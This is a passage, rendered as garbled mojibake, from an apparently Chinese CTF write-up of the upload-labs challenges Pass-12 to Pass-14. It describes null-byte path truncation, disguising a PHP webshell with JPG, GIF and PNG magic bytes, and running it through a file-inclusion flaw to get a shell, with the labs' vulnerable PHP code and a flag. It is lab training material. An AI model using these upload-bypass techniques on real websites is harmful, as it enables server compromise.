·ã€‚</p><h2 id="12-2-è§£é¢˜"><a href="#12-2-è§£é¢˜" class="headerlink" title="12.2 è§£é¢˜"></a>12.2 è§£é¢˜</h2><ul><li>ä¸Šä¼ yjh.phpæŠ“åŒ…</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2014.52.40.png" style="zoom:50%;"><ul><li>è·Ÿä¸Šä¸€å…³ä¸€æ ·ï¼Œåªä¸è¿‡è¿™é‡Œæ”¾åœ¨POSTå‚æ•°ä¸­äº†ã€‚</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2015.08.00.png" style="zoom:50%;"><p>ä¸Šé¢æ˜¯ç”¨yakitçš„fuzztagæ“ä½œçš„ï¼ˆé™äºç¯å¢ƒï¼Œè¿˜æœªæˆåŠŸéªŒè¯ï¼‰ã€‚</p><p>å¦‚æœç”¨çš„æ˜¯bpï¼Œåœ¨HEXä¸­ä¿®æ”¹ï¼Œæ‰¾åˆ°phpä»£è¡¨çš„åå…­è¿›åˆ¶<code>706870</code>ï¼Œå°†åä¸€ä¸ª16è¿›åˆ¶æ•°æ”¹ä¸º00ã€‚</p><p>è·Ÿpass-11ä¸€æ ·ï¼Œæ€è·¯æ²¡é—®é¢˜ï¼Œä½†æ˜¯åœ¨ç›®æ ‡ç¯å¢ƒä¸­éªŒè¯å¤±è´¥ï¼Œå¯èƒ½æ˜¯PHPç‰ˆæœ¬å’Œé…ç½®çš„åŸå› ã€‚</p><ul><li>å®ç°è¦æ±‚</li></ul><ol><li>phpç‰ˆæœ¬è¦å°äº5.3.4</li><li>php.iniä¸­çš„é…ç½®<code>magic_quotes_gpc=OFF</code></li></ol><h2 id="12-3-ä»£ç å®¡è®¡"><a href="#12-3-ä»£ç å®¡è®¡" class="headerlink" title="12.3 ä»£ç å®¡è®¡"></a>12.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_path'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ä¸Šä¼ å¤±è´¥"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·Ÿä¸Šä¸€å…³ä¸€æ ·ï¼Œåªæ˜¯   <code>$_POST['save_path']</code>æ›¿æ¢äº†<code>$_GET['save_path']</code>ã€‚</p><h1 id="åä¸‰ã€Pass-13ï¼ˆæ–‡ä»¶å¤´æ£€æµ‹-å›¾ç‰‡æœ¨é©¬-æ–‡ä»¶åŒ…å«ï¼‰"><a href="#åä¸‰ã€Pass-13ï¼ˆæ–‡ä»¶å¤´æ£€æµ‹-å›¾ç‰‡æœ¨é©¬-æ–‡ä»¶åŒ…å«ï¼‰" class="headerlink" title="åä¸‰ã€Pass-13ï¼ˆæ–‡ä»¶å¤´æ£€æµ‹-å›¾ç‰‡æœ¨é©¬+æ–‡ä»¶åŒ…å«ï¼‰"></a>åä¸‰ã€Pass-13ï¼ˆæ–‡ä»¶å¤´æ£€æµ‹-å›¾ç‰‡æœ¨é©¬+æ–‡ä»¶åŒ…å«ï¼‰</h1><h2 id="13-1-é¢˜é¢"><a href="#13-1-é¢˜é¢" class="headerlink" title="13.1 é¢˜é¢"></a>13.1 é¢˜é¢</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2014.59.24.png" style="zoom:40%;"><p>è¿™ä¸€å…³çš„é¢˜é¢æœ‰äº›ä¸åŒï¼Œæ¶‰åŠåˆ°ä¸‰ç§ç±»å‹çš„å›¾ç‰‡æœ¨é©¬ã€‚</p><h2 id="13-2-jpgå›¾ç‰‡æœ¨é©¬"><a href="#13-2-jpgå›¾ç‰‡æœ¨é©¬" class="headerlink" title="13.2 jpgå›¾ç‰‡æœ¨é©¬"></a>13.2 jpgå›¾ç‰‡æœ¨é©¬</h2><ul><li>ä¸Šä¼ yjh.phpæŠ“åŒ…</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2015.23.20.png" style="zoom:50%;"><p>æç¤ºæ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ã€‚</p><ul><li>ä»…æ”¹åç¼€ä¸º.jpg</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2015.24.29.png" style="zoom:50%;"><p>æ— æ³•ä¸Šä¼ ï¼Œå¯èƒ½æ£€æµ‹MIMEæˆ–æ–‡ä»¶å†…å®¹ã€‚</p><p>ä¿®æ”¹MIMEç±»å‹ï¼Œè¿˜æ˜¯å¤±è´¥ï¼Œè¯´æ˜æ£€æµ‹çš„æ˜¯æ–‡ä»¶å†…å®¹ï¼ˆæ–‡ä»¶å¤´ï¼‰ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2015.25.47.png" style="zoom:50%;"><ul><li>jpgå›¾ç‰‡æœ¨é©¬åˆ¶ä½œ</li></ul><p>jpgæ–‡ä»¶å¹»æ•°</p><blockquote><p>å¦‚æœä½ ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ä¸€ä¸ª JPG æ–‡ä»¶ï¼Œæ–‡ä»¶çš„å‰å‡ ä¸ªå­—èŠ‚é€šå¸¸æ˜¯ <code>FF D8 FF</code>ã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-none"><code class="language-none">FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 60 00 60 00 00 ...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>FF D8 FF</code> æ˜¯ JPG æ–‡ä»¶çš„æ–‡ä»¶ç­¾åã€‚</li><li>åç»­çš„å­—èŠ‚æ˜¯æ–‡ä»¶çš„å…¶ä»–å…ƒæ•°æ®å’Œå›¾åƒæ•°æ®ã€‚</li></ul></blockquote><p>å…ˆå®éªŒä¸€ä¸‹é•¿çš„å¹»æ•°ï¼š<code>FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 01 2C</code></p><p>å°†yjh.phpåç¼€æ”¹æˆ.jpg</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2015.29.37.png" style="zoom:50%;"><p>ç”¨010editoråå…­è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ï¼šï¼ˆå®‰è£…æ¿€æ´»æ–¹æ³•è§æœ¬ç«™ã€Š010editoråå…­è¿›åˆ¶ç¼–è¾‘å™¨ã€‹ä¸€æ–‡ã€‚ï¼‰</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2016.30.56.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2016.39.08.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2016.39.46.png" style="zoom:67%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2016.43.39.png" style="zoom:50%;"><p>ä¿å­˜ã€‚</p><p>ä¸Šä¼ æŠ“åŒ…ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2016.49.53.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°å¦‚æœç†Ÿæ‚‰yakitçš„è¯åº”è¯¥èƒ½ç›´æ¥åœ¨è¯·æ±‚åŒ…è¿™é‡Œåˆ¶ä½œå›¾ç‰‡æœ¨é©¬ã€‚</p><p>å›¾ç‰‡æœ¨é©¬æˆåŠŸä¸Šä¼ ã€‚ä½†æ˜¯å¦‚ä½•è§£ææ‰§è¡Œå‘¢ï¼Ÿ</p><p>ç‚¹å‡»<code>æ–‡ä»¶åŒ…å«æ¼æ´</code></p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2016.56.06.png" style="zoom:50%;"><p>åªéœ€è¦åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´åŒ…å«ä»¥ä¸‹å³å¯ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2016.57.26.png" style="zoom:50%;"><ul><li>èšå‰‘getshellï¼š</li></ul><p>è®¿é—®ä¸Šä¼ æˆåŠŸçš„å›¾ç‰‡ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2017.01.48.png" style="zoom:40%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2017.01.17.png" style="zoom:40%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2017.02.45.png" alt="flag" style="zoom:50%;"><p>Flag:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>a24f5301-e5b2-4a4b-a979-c53a15b86360<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>çŸ¥é“åªæ£€æµ‹äº†å‰ä¸¤ä¸ªå­—èŠ‚ä¹‹åï¼Œæœ¨é©¬åˆ¶ä½œå¯ä»¥æ›´ç®€å•ä¸€äº›ã€‚</p></li><li><p>æ—¢ç„¶yakitæœ‰å¾ˆå¤šæ ‡ç­¾å¯ç”¨ï¼Œé‚£å°±ä¸éœ€è¦å†æ‰‹åŠ¨ä¸€æ­¥æ­¥åˆ¶ä½œäº†ã€‚</p></li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2017.31.40.png" alt="ä½¿ç”¨yakitæ ‡ç­¾å¿«é€Ÿä¸Šä¼ å›¾ç‰‡æœ¨é©¬" style="zoom:50%;"><h2 id="13-3-gifå›¾ç‰‡æœ¨é©¬"><a href="#13-3-gifå›¾ç‰‡æœ¨é©¬" class="headerlink" title="13.3 gifå›¾ç‰‡æœ¨é©¬"></a>13.3 gifå›¾ç‰‡æœ¨é©¬</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">47</span> <span class="token number">49</span> <span class="token number">46</span> <span class="token number">38</span> <span class="token number">39</span> <span class="token number">61</span> F1 00 2C 01 F7 00 00 <span class="token number">64</span> <span class="token number">32</span> <span class="token number">33</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨yakitçš„gifæ–‡ä»¶å¤´æ ‡ç­¾å¯ä»¥å¿«é€Ÿæ— ç—›ç”Ÿæˆå›¾ç‰‡æœ¨é©¬ã€‚å…¶ä»–æ–‡ä»¶å¤´å¯ä»¥å‚è€ƒæœ¬ç«™ã€ŠYakitå•å…µå®‰å…¨èƒ½åŠ›å¹³å° ã€‹ä¸€æ–‡çš„â€œæ ‡ç­¾ä½¿ç”¨ç»éªŒç§¯ç´¯â€ç« èŠ‚ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2017.20.46.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2017.20.04.png" style="zoom:50%;"><p>æˆåŠŸgetshellï¼Œéå¸¸ä¸æ»‘ã€‚</p><h2 id="13-4-pngå›¾ç‰‡æœ¨é©¬"><a href="#13-4-pngå›¾ç‰‡æœ¨é©¬" class="headerlink" title="13.4 pngå›¾ç‰‡æœ¨é©¬"></a>13.4 pngå›¾ç‰‡æœ¨é©¬</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">89</span> <span class="token number">50</span> 4E <span class="token number">47</span> 0D 0A 1A 0A 00 00 00 0D <span class="token number">49</span> <span class="token number">48</span> <span class="token number">44</span> <span class="token number">52</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2017.25.39.png" style="zoom:50%;"><p>åŒç†åˆ¶ä½œpngå›¾ç‰‡æœ¨é©¬ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2017.26.44.png" style="zoom:50%;"><p>æˆåŠŸgetshellã€‚</p><h2 id="13-6-ä»£ç å®¡è®¡"><a href="#13-6-ä»£ç å®¡è®¡" class="headerlink" title="13.6 ä»£ç å®¡è®¡"></a>13.6 ä»£ç å®¡è®¡</h2><p>æŸ¥çœ‹ä¸€ä¸‹æç¤ºå’Œä»£ç ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2016.51.37.png" style="zoom:50%;"><p>åªæ£€æµ‹å¤´ä¸¤ä¸ªå­—èŠ‚ã€‚</p><p>ä»£ç å®¡è®¡ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">getReailFileType</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$bin</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åªè¯»2å­—èŠ‚</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$strInfo</span> <span class="token operator">=</span> @<span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"C2chars"</span><span class="token punctuation">,</span> <span class="token variable">$bin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$typeCode</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chars1'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chars2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$typeCode</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token keyword">case</span> <span class="token number">255216</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">13780</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token number">7173</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'unknown'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token variable">$fileType</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_type</span> <span class="token operator">=</span> <span class="token function">getReailFileType</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file_type</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'unknown'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_type</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ä¸Šä¼ å‡ºé”™ï¼"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>255 216</code>ä¸¤ä¸ªå­—èŠ‚ å¯¹åº”çš„å°±æ˜¯<code>ff d8</code>ã€‚å…¶ä»–æ£€æµ‹ä¹ŸåŒç†ã€‚</p><h1 id="åå››ã€Pass-14-ï¼ˆgetimagesizeæ–‡ä»¶ç±»å‹æ£€æµ‹-å›¾ç‰‡æœ¨é©¬ï¼‰"><a href="#åå››ã€Pass-14-ï¼ˆgetimagesizeæ–‡ä»¶ç±»å‹æ£€æµ‹-å›¾ç‰‡æœ¨é©¬ï¼‰" class="headerlink" title="åå››ã€Pass-14*ï¼ˆgetimagesizeæ–‡ä»¶ç±»å‹æ£€æµ‹-å›¾ç‰‡æœ¨é©¬ï¼‰"></a>åå››ã€Pass-14*ï¼ˆgetimagesizeæ–‡ä»¶ç±»å‹æ£€æµ‹-å›¾ç‰‡æœ¨é©¬ï¼‰</h1><h2 id="14-1-é¢˜é¢"><a href="#14-1-é¢˜é¢" class="headerlink" title="14.1 é¢˜é¢"></a>14.1 é¢˜é¢</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.04.58.png" style="zoom:40%;"><p>è¿™ä¸€å…³è·Ÿä¸Šä¸€å…³ç±»ä¼¼ï¼Œè€ƒå¯Ÿçš„éƒ½æ˜¯å›¾ç‰‡æœ¨é©¬ã€‚</p><h2 id="14-2-jpgå›¾ç‰‡æœ¨é©¬"><a href="#14-2-jpgå›¾ç‰‡æœ¨é©¬" class="headerlink" title="14.2 jpgå›¾ç‰‡æœ¨é©¬"></a>14.2 jpgå›¾ç‰‡æœ¨é©¬</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.11.25.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.16.55.png" style="zoom:50%;"><p>   æŒ‰ç…§ä¸Šä¸€å…³çš„æ“ä½œå°è¯•ä¸Šä¼ å›¾ç‰‡æœ¨é©¬ï¼Œä¸Šä¼ å¤±è´¥ã€‚</p><ul><li>çœ‹ä¸‹æç¤º</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.13.03.png" style="zoom:50%;"><p>æç¤ºä½¿ç”¨getimagesize()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ã€‚</p><blockquote><h4 id="getimagesize-æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶çš„åŸç†"><a href="#getimagesize-æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶çš„åŸç†" class="headerlink" title="getimagesize()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶çš„åŸç†"></a>getimagesize()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶çš„åŸç†</h4><p><code>getimagesize()</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºè·å–å›¾åƒæ–‡ä»¶çš„å¤§å°å’Œç±»å‹ä¿¡æ¯ã€‚å®ƒä¸ä»…å¯ä»¥è¯»å–å›¾åƒæ–‡ä»¶çš„å°ºå¯¸ï¼ˆå®½åº¦å’Œé«˜åº¦ï¼‰ï¼Œè¿˜å¯ä»¥é€šè¿‡æ–‡ä»¶å¤´ä¿¡æ¯åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºæœ‰æ•ˆçš„å›¾åƒæ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯ <code>getimagesize()</code> æ£€æŸ¥å›¾åƒæ–‡ä»¶çš„åŸç†ï¼š</p><ol><li><strong>æ–‡ä»¶å¤´ä¿¡æ¯æ£€æŸ¥</strong></li></ol><p><code>getimagesize()</code> çš„æ ¸å¿ƒåŸç†æ˜¯é€šè¿‡è¯»å–æ–‡ä»¶çš„å¤´éƒ¨ä¿¡æ¯æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºæœ‰æ•ˆçš„å›¾åƒæ–‡ä»¶ã€‚æ¯ç§å›¾åƒæ ¼å¼éƒ½æœ‰å…¶ç‹¬ç‰¹çš„æ–‡ä»¶å¤´ï¼ˆä¹Ÿç§°ä¸ºæ–‡ä»¶ç­¾åæˆ–å¹»æ•°ï¼‰ï¼Œè¿™äº›æ–‡ä»¶å¤´ç”¨äºæ ‡è¯†æ–‡ä»¶çš„ç±»å‹ã€‚ä¾‹å¦‚ï¼š</p><ul><li><strong>JPG æ–‡ä»¶</strong>ï¼šæ–‡ä»¶å¤´é€šå¸¸æ˜¯ <code>FF D8 FF</code>ã€‚</li><li><strong>PNG æ–‡ä»¶</strong>ï¼šæ–‡ä»¶å¤´æ˜¯ <code>89 50 4E 47 0D 0A 1A 0A</code>ã€‚</li><li><strong>GIF æ–‡ä»¶</strong>ï¼šæ–‡ä»¶å¤´æ˜¯ <code>47 49 46 38 39 61</code> æˆ– <code>47 49 46 38 37 61</code>ã€‚</li></ul><p><code>getimagesize()</code> ä¼šè¯»å–æ–‡ä»¶çš„å‰å‡ 